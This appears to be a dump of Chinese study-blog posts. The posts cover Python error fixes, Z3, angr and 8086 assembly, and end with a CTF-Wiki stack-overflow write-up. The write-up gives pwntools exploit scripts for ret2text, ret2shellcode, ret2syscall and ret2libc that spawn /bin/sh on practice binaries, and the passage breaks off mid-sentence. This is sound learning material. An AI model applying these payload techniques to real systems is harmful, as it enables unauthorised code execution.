“/usr/share/python-wheels/CacheControl-0.11.5-py2.py3-none-any.whl/cachecontrol/adapter.py”, line 46, in send resp = super(CacheControlAdapter, self).send(request, **kw) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/adapters.py”, line 376, in send timeout=timeout File “/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/connectionpool.py”, line 610, in urlopen _stacktrace=sys.exc_info()[2]) File “/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/util/retry.py”, line 228, in increment total -= 1TypeError: unsupported operand type(s) for -=: ‘Retry’ and ‘int’ 解决办法:(主要是pip的版本问题引起的) easy_install pip pip install –upgrade pip (此处执行原本要进行的命令) 报错2:AttributeError: ‘module’ object has no attribute ‘b64encode’ import base64出现的报错 原因：.pyc文件出现的问题 解决办法：将base64.py重命名，并删除pyc文件。 Python运行时，会先查找该程序所在路径，是否有相关的模块，有则直接引用。正好该目录下有一个base64.py文件，而这个文件非官方的base64库。 1.什么是pyc文件？ pyc文件是python编译后的字节码文件。Python的程序中，是把原始程序代码放在.py文件里，而Python会在执行.py文件的时候。将.py形式的程序编译成中间式文件（byte-compiled）的.pyc文件，这么做的目的就是为了加快下次执行文件的速度。 2.Python运行过程 Python是一种解释型语言，每次执行都需要进行一次翻译。执行 python *.py 后，将会启动 Python 的解释器，将 *.py 编译成一个字节码对象 PyCodeObject，存放在内存，当这个模块的 Python 代码执行完之后就会将编译结果保存到 *.pyc文件中，下一次就不需要编译，直接加载到内存中。 a.模块在被导入时会先检查本地目录下是否有pyc文件 b.若有pyc文件，对比py文件的修改时间是否一致，若一致，直接使用pyc文件，若不一致，对py文件进行解释，并将结果覆盖本地的pyc文件 c.若未找到pyc文件，对py文件进行解释，并将结果回写到本地的pyc文件中 重名出现的问题 报错4:python前注释12#!/usr/bin/env python# -*- coding:utf-8 -*- 报错5：IndentationError: unexpected indent 此处有一个意料之外的缩进 IndentationError:expected an indented block 此处需要一个缩进 注意空格与Tab不能混用 报错6：SyntaxError: unexpected EOF while parsing 未验证函数参数是否有效，传入了空的参数。 快速查找python安装路径的方法：打开cmd 12345pythonimport sysprint(sys.path) 打印出来的第四个即python的安装路径。 报错7123456CondaHTTPError: HTTP 000 CONNECTION FAILED for url &lt;https://conda.anaconda.org/conda-forge/win-64/repodata.json&gt;Elapsed: -An HTTP error occurred when trying to retrieve this URL.HTTP errors are often intermittent, and a simple retry will get you on your way.&apos;https://conda.anaconda.org/conda-forge/win-64&apos; 连接国外的服务器超时，要换成国内镜像源。 报错81[WinError 193] %1 不是有效的 Win32 应用程序。 python位数与dll位数不同，需要统一。]]></content>
      <tags>
        <tag>error</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Z3约束求解器]]></title>
    <url>%2F2019%2F07%2F14%2FZ3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3%E5%99%A8%2F</url>
    <content type="text"><![CDATA[如果高中数学给我们用Z3就好了 0X00:IntroductionZ3求解器给我们提供了一个非常便利求解方式，我们只需要定义未知量（x,y等），然后为这些未知量添加约束方式即可求解。 0X01:基本用法x = Int(‘x’) y = Int(‘y’) solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 首先要定义要求解的几个参数，然后用变量把核心的方程搭建出来，之后就会自动求解，最后打印出来就行。 基本的框架如此，具体的代码还是要多在实际中写。虽然CTF逆向比赛中重点考察的是逆向的能力，采用求解器的方式来求解并不能锻炼到自己的逆向逻辑，自己肝才是大佬。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angr]]></title>
    <url>%2F2019%2F07%2F14%2Fangr%2F</url>
    <content type="text"><![CDATA[0X00:Introductionangr是一个二进制代码分析工具，能够自动化完成二进制文件的分析，并找出漏洞，是一个基于python的二进制漏洞分析框架，它将以前多种分析技术集成进来，­­­它能够进行动态的符号执行分析，也能够进行多种静态分析。 0X01:基本过程 将二进制程序载入angr分析系统 将二进制程序转换成中间语言 将IR语言转换成语义较强的表达形式 执行进一步的分析 0X02：用法angr-CLE：首先加载二进制文件，在加载二进制文件的时候会分析病读取binary的信息，包括指令地址、shared library、arch information等等。 import angr b = angr.Project(“./test”) angr_IR：angr用VEX IR将指令转化为中间语言IRangr-Solver Engine： import claripybv = claripy.BVV(0x41424344, 32) ArchInfoArchinfo是包含特定于体系结构的信息的类的集合。例如，little-endian amd64、little-endian i386。 PyVexPyVex是中间语言，Angr使用Valgrind的中间语言——VEX来完成这方面的内容。VEX中间语言抽象了几种不同架构间的区别，允许在他们之上进行统一的分析。各种中间语言在设计理念上有很多的共通点 SimuVEXSimuVEX模块是中间语言VEX执行的模拟器，它允许你控制符号执行。 Angr是一个很强大的工具，对进行过代码混淆的代码，无法在IDA中反编译，但能够用这个工具。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编]]></title>
    <url>%2F2019%2F07%2F12%2F%E6%B1%87%E7%BC%96%2F</url>
    <content type="text"><![CDATA[下学期开课，复习一下。 1.指令与数据在内存中的都是以同样的二进制流存放的，区别之处在于是从哪根总线（数据总线/控制总线）传入。2.地址总线宽度决定CPU的 寻址能力。2的N次方个。数据总线的宽度决定了数据的传输速度。控制总线的宽度决定了控制能力。3.核心思维：从CPU的角度去考虑问题。4.寄存器中，数据是采用的小端序存储。5.AX=AH+AL，EAX是32位寄存器，AX是16位，AH/AL是8位6.汇编指令不区分大小写。7.8226H+8826H，在ax中就会变成044C（本来是1044C），多出来的1会在标志位中显示。注意对AH和AL运算时，不能越界。8.8086的CPU内部结构为16位，只能传送16位的地址，所以寻址能力只有64K。但是其地址总线的宽度为20位，寻址能力有1M。所以采用16位段地址与16位偏移地址，经过地址加法器合并为20位的物理地址后，再进行输出。 9.地址加法器的工作原理：物理地址等于段地址X16（即在末端加上个0，数据左移4位。）再加上偏移地址。10.一个数据的X进制形式左移一位，即相当于乘上X。11.CPU中的内存是连续的，但是人为的划分可以分成段。段地址X16可以得到基础地址，加上偏移地址得到物理地址。12.偏移地址为16位，所以允许的一个段的长度最大为64K。13.CPU可以通过不同的段地址与偏移地址形成一个物理地址。14.数据在一个存储单元中，可以有两种不同的表述：如数据被存储在21F60H的存储单元中，可以表示为”数据在内存2000：1F60H。”也可以表示为”数据在内存的2000段中的1F60H元中。 15.可以根据需要，将一组连续的且起始地址为16倍数的内存空间定义为一个段。16.段寄存器就是提供段地址的，8086CPU有4个段寄存器，分别是CS（code），DS（data),SS(stack),ES(extra)。17.一个宏观的想法：无论是程序还是数据，当其加载到内存中之后，都是一段二进制代码流。其中的一部分由控制总线传入转化成命令，其中的一部由数据总线传入转化成十六进制数据。18.CS与IP，为8086CPU最重要的两个寄存器，指示了CPU当前要读取的指令的地址，CS为代码段寄存器，IP为指针寄存器。 即任意时刻，CPU将CS:IP指向的内容当作指令执行。19.物理地址从地址总线传到内存中后，读取内存单元中存放的指令，指令通过数据总线途经输入输出控制电路，到达指令缓冲器。且读取一条指令后，IP的值会自动增加，使CPU可以读取下一条指令（根据当前读取的指令长度而加上该长度到达下一条指令位置。）。20.能够改变CS/IP内容的指令被称为转移指令；最简单的转移指令：jmp。jmp 段地址：偏移地址，课将CS和IP修改到指定值。同时jmp+某一合法寄存器的值可只修改IP。21.sub，减法运算。sub ax，bx，即为ax-bx。22.内存中字的存储：高位对应高低址位，低位对应低地址位。所以对于一个内存单元中的数，应该从下往上读取。23.字单元：存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。24.mov指令还可以将一个内存单元中的内容送入寄存器。mov 寄存器名，内存单元地址。[…]表示偏移地址，另外确定内存单元所需的段地址由DS决定（一致）。将寄存器中的内容送入内存单元表示为：mov […]，寄存器名。25.8086CPU不支持直接将数据写入段寄存器，必须先通过改变其他寄存器的值，然后寄存器与寄存器间进行操作，才能改变段寄存器的值。 指令中只写偏移地址，段地址需要在事先改变。26.mov的用法小结：mov 寄存器，数据/mov 寄存器，寄存器/mov 寄存器，内存单元/mov 内存单元，寄存器/mov 段寄存器，寄存器/mov 寄存器，段寄存器。27.类比代码段得到数据段的定义方法：将某为16倍数的地址作为首地址，不超过64K的长度作为数据段长度，把dx段寄存器改为首地址即可。28.字型数据–&gt;偏移地址差为2位。29.现如今的CPU都有栈的设计，8086CPU提供相关指令以栈的形式访问内存，所以在基于8086CPU编程的时候，可以将一段连续的内存空间作为栈使用。30.从程序化的角度来看，必须有一个指针指向栈最上面的元素。 31.如何知道一段内存空间被当作栈来使用？如何知道接下来要操作的栈中数据哪个是在栈顶的。类似于CS:IP,8086CPU中，SS：IP始终指向栈顶。32.栈顶指针可以指到最底层。33.POP或者PUSH指令，在两种极端情况下都会造成栈溢出。34.栈是一种可以被特殊访问的内存空间。35.PUSH指令和POP指令，可以在内存与寄存器之间传递数据，也可以在寄存器与寄存器之间，内存与内存之间传递数据。由于栈中的操作对象（栈顶指针所指向的字型数据确定，所以在指令中只需写偏移指令或者寄存器名称。36.栈顶清零不能用MOV AX,0。要用SUB AX,AX。 37.将10000H~1000FH的空间当作栈的初始化汇编代码：mov ax,10000Hmov ss,axmov sp,0010H ss是段寄存器，不能被直接赋值。注意后面栈顶指针的指向，实际上已经超出了栈的范围，在栈底的下面一位更高地址。38.push ax是入栈指令，它将在栈顶之上压入新的数据。一定要注意其执行过程是：先将记录栈顶偏移地址的SP减2，使得SS：SP指向新的内存单元，然后再将数据写入内存单元中。39.我们要十分清楚的是：push和pop指令与mov指令不同，CPU执行mov指令只需一步操作，即传送。而执行push指令时，实际上有两步操作：先改变SP的值，后向SS:SP处传送。执行pop指令时，先读取SS:SP的数据，再改变SP的值。 40.为什么栈的长度最大只有64K？与数据总线是16位有关。64X1024=2的16次方。41.数据段没有指针，直接用偏移地址。 42.伪指令，伪指令无法被编译成机器指令被CPU执行，由编译器执行。segments和ends是一对成对使用的伪指令，这是在写可被编译的汇编程序时必须要用到的伪指令。segment和ends的功能是定义一个段，segment说明一个段的开始，ends说明一个段的结束。 段的使用格式：段名 segment： 段名 ends43.一个汇编程序是由多个段组成的，这些段被用来存放代码，数据或者被当作栈空间。一个源程序中，所有将被计算机所处理的信息即指令，数据，栈被划分到不同的段。44.ends与segments配对使用，分别表示段的开始与结束。end与ends是两个不同的概念，end是整个程序的结束。45.assume指令，将有特定用途的段与相关的段寄存器联系起来。比如用assume指令将代码段与CS联系起来。46.源程序：源程序文件当中的所有内容。程序：源程序中最终由计算机处理的指令或者数据。47.与C语言类似，汇编中除了汇编指令，伪指令外，还有标号（段名）会在被编译的时候，转变为内存地址。48.程序返回：一段汇编指令被编译成机器码储存在可执行文件中，要想运行必须载入内存。在dos单个任务操作系统上，必须先有正在运行的程序P1，将CPU的控制权交给P2后，P2才得以运行。所以一个程序结束运行后，必须将CPU控制权交给下一个程序，这个交换的过程成为程序返回。代码：mov ax，4c00Hint 21H49.源程序在编译的过程中被发现的错误称之为语法错误，编译完成后执行时发生的错误为逻辑错误。50.asm，汇编源程序的扩展名。51.源程序被编译后，可以得到obj（目标文件）/lst（列表文件）/crf（交叉引用文件）52.53.要完整地描述一个内存单元，需要两种信息。一是内存单元地地址，二是内存单元存储的长度（数据类型）。用[0]表示一个内存单元时，0表示单元的偏移地址，段地址默认存储在ds中，单元的长度类型可以由具体指令中的其他操作对象比如寄存器指出。类似的，[bx]也表示一个内存单元，其偏移地址在bx中。54.（bx）表示bx中的内容。 （）中可以有三种类型，寄存器名，段寄存器名，内存单元的物理地址。 由此可知，（X）中的数据类型有两种，字或者字节。 15.注意push与pop指令对sp操作的先后顺序。56.[idata]，表示数据 57.mov ax，[bx]表示把bx中存放的数据作为一个偏移地址EA,段地址SA默认在ds中，将SA:EA处的数据送入ax中。mov [bx],ax表示把bx中存放的数据作为偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处。58.inc表示自增。59.cx与loop指令直接关联，存放循环的次数。60.cx的使用：mov ax，2mov cx，11s：add ax，axloop s可计算2的12次方61.在汇编语言中，标号代表一个地址，此程序中有一个标号（可以是任意字母），用来标识一个地址，这个地址处的指令就是所要循环的指令。62.能否将ffff：0~ffff：b中的数据直接累加到dx中？不能，直接的累加对位数有要求，相同位数的才能够直接相加。解决办法：将ax中的al和ah拆分开来用。63.出现在访问内存单元的指令中，用于显式地知名内存单元的段地址的ds，cs，ss，es，在汇编语言中称为段前缀。使用段前缀可以在某些情况下减少代码的行数。64.在不能确定一段内存空间中是否存放着重要的数据或者代码的时候，不能随意 向其中写入内容。Dos方式下，一般情况，0：200·0：2ff空间中没有系统或者其他程序的数据或者代码。65.lea, load effective address, 加载有效地址. 指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&amp;”.66.movs/movsb/movsw/movsd edi,esi这些变体以串/字节/字/双字为单位，将esi的值赋给edi。67.movsx符号位扩展，byte-&gt;word，word–&gt;dword（扩展后高位全用符号位填充），然后实现mov。68.movzx零扩展，byte-&gt;word，word-&gt;dword（扩展后高位全部用零填充），然后实现mov。69.CMP指令根据比较两个操作数的结果设置C/O/Z标志位。若两个寄存器中的值相等，则Z标志位置1，否则置零。也可以直接用[地址]与寄存器进行比较。70.逆向工程中常用的三个标志位，C/O/Z，C为进位标志，记录运算时从最高有效位产生的进位值。执行加法运算时，最高有效位有进位时置1，否则置0.O标志位，溢出标志，在运行过程中，如果操作数超出了机器能表示的范围则称为溢出，溢出置1，未溢出置0.Z标志位最常用，运算结果为0时，Z标志位置1，否则置0. 71.XOR异或运算，当两个结果存在不同的时候进行或运算，相同的时候保持不变。NOT,非运算。72.test dest，src指令，与AND指令一样，对两个操作数进行按位的“与”运算，唯一不同的是不将结果保存到dest，不对操作数的内容进行修改，只修改标志位。实际操作中，一般都是test eax，eax，如果eax的值为0，则Z标志位置1.73.各种跳转及其条件：JMP 无条件跳转]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF-Wiki Stack Overflow and ROP]]></title>
    <url>%2F2019%2F06%2F20%2FCTF-Wiki%2F</url>
    <content type="text"><![CDATA[CTF-Wiki中几道例题的思路 从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。 0X01–栈溢出的基本原理： 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。 函数调用指令: CALL(注意理解EBP的变化过程，它指向下一条指令要操作的数据) 大致过程: 参数入栈 返回地址入栈 代码区块跳转 栈帧调整: 保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈) 将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部) 给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶) 0X02–栈溢出的保护类型： 知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。 Canary：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。编译时的关闭指令：-fno-stack-protector ALSR与PIE(Position Independent Executable)：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功）编译时ALSR的关闭指令：echo 0&gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态，可以用cat+路径显示相关的参数：0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 PIE编译时的关闭指令：-no-pie，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。 Linux平台下的NX,Windows平台上的DEP：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 0X03–编译指令： gcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie） sudo -secho 0 &gt; /proc/sys/kernel/randomize_va_space ($ cat /proc/sys/kernel/randomize_va_space指令检查)exit（关闭ALSR)-z execstack（关闭NX保护） test.c -o test(由test.c生成test可执行文件) -g(GDB调试) 0X04–ROP原理： 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ropgadget，注意命令格式：ROPgadget –binary [文件名] –only’寄存器名|寄存器名’ | grep ‘eax’。 0X05–四种类型： 第一种类型ret2text: 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(“You Hava already controlled it.”); &#125;void vulnerable()&#123;char s[12];gets(s);puts(s);return;&#125;int main(int argc, char **argv) &#123;vulnerable();return 0;&#125; 只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。 EXP如下： 123456789101112131415##coding=utf8## 导入pwntools库from pwn import *## 构造与程序交互的对象，sh = process(&apos;./文件名&apos;)表示打本地，日自己。sh = process(&apos;./stack_example&apos;)## 已知了想要执行的函数地址success_addr = 0x0804843b## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)##print可以帮助自己看脚本执行到了哪一步print p32(success_addr)## 向程序发送字符串sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive() 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(“/bin/sh”)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。 123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。 1234567891011121314151617gef➤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf);───────────────────────────────────────────────────────────────────────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; 断点下在Call处为什么是这个Call处？(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。 每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。 EXP如下： 1234567891011##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2text&apos;)target = 0x0804863ash.sendline(&apos;A&apos; * (0x6c+4) + p32(target))sh.interactive() 我觉得这道题倒是让我弄明白了buf的表示，位置关系。 上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。 第二种类型ret2shellcode： ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; 程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。 12.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] 通过vmmap观察该bss段是否可执行： 12345678910111213141516171819202122232425262728293031323334gef➤ b mainBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.gef➤ rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:88 setvbuf(stdout, 0LL, 2, 0LL);─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]──── 6 int main(void) 7 &#123; → 8 setvbuf(stdout, 0LL, 2, 0LL); 9 setvbuf(stdin, 0LL, 1, 0LL); 10 ─────────────────────────────────────────────────────────────────────[ trace ]────[#0] 0x8048536 → Name: main()─────────────────────────────────────────────────────────────────────────────────────────────────────gef➤ vmmap Start End Offset Perm Path0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so0xfffdd000 0xffffe000 0x00000000 rwx [stack] 所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。 EXP如下: 123456789#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2shellcode&apos;)## 自动生成shellcodeshellcode = asm(shellcraft.sh())buf2_addr = 0x804a080## shellcode先放入，剩余的再用&apos;A&apos;填充至112长度。sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr))sh.interactive() shellcode放进去了不需要别的操作吗？这个buf2_addr指的是什么？如何通过调试确定需要填充的长度？ 第三种类型：ret2syscall：即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。 1execve(&quot;/bin/sh&quot;,NULL,NULL) 由于该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。 具体实现–ropgadgets 这个工具: only ‘pop|ret’ | grep ‘eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(“/bin/sh”,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。 平凡无奇的存在栈溢出漏洞的程序源码如下： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;&#125; 想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。 此外，我们需要获得 /bin/sh 字符串对应的地址。 1234➜ ret2syscall ROPgadget --binary rop --string &apos;/bin/sh&apos; Strings information============================================================0x080be408 : /bin/sh 以及int 0x80的地址： 123456789➜ ret2syscall ROPgadget --binary rop --only &apos;int&apos; Gadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4 EXP如下： 123456789101112131415#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./rop&apos;)## 找到的gadgets及其地址pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。payload = flat([&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。 第四种类型：ret2libc libc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(“/bin/sh”). 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets((char *)&amp;v4); return 0;&#125; 确定存在栈溢出漏洞,用IDA找到了system函数,用ropgadget查找到”/bin/sh”。 则EXP如下： 1234567891011#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc1&apos;)binsh_addr = 0x8048720system_plt = 0x08048460payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr])sh.sendline(payload)sh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。 当查找不到”/bin/sh”时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。 EXP如下： 12345678910111213##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc2&apos;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([&apos;a&apos; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 注意payload中的pop_ebx是用来平衡堆栈的。 同时找不到”/bin/sh”与system()函数地址的情况，用到了两个知识点： system 